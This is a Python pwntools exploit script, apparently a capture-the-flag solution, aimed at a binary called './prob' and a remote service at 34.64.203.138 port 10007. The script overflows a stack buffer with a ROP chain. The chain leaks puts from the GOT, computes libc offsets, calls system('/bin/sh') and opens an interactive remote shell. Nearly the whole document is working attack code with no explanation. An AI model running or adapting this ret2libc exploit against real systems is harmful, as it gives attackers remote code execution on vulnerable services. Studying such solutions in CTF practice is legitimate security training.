from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './prob'
HOST = '34.64.203.138'
PORT = 10007

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		#rem = process('/bin/sh', stdout=process.PTY, stdin=process.PTY)
		#rem = process('/bin/sh')
		#rem.sendlineafter('$ ', 'nc 34.64.203.138 10007')
		#rem.sendline('nc 34.64.203.138 10007')
		#return rem
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])
rdi = 0x4011ca+1
bss = 0x4040a0

r.sendline('a'*18+flat(rdi, elf.got.puts, elf.sym.puts, rdi, bss, elf.sym.gets, rdi, bss, elf.sym.puts, rdi, bss, elf.sym.puts, elf.sym.main))
	
	
r.sendline('a'*0x800)
#r.recv(0x1000)
r.recvuntil('\n')
r.recvuntil('\n')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak -0x84420
system = base + 0x52290
binsh = base + 0x1b45bd
r.sendlineafter('\n', 'a'*18+flat(rdi, binsh, system))
#r.sendlineafter('\n', 'a'*18+flat(rdi+1,rdi, binsh, system))

r.interactive()
r.close()
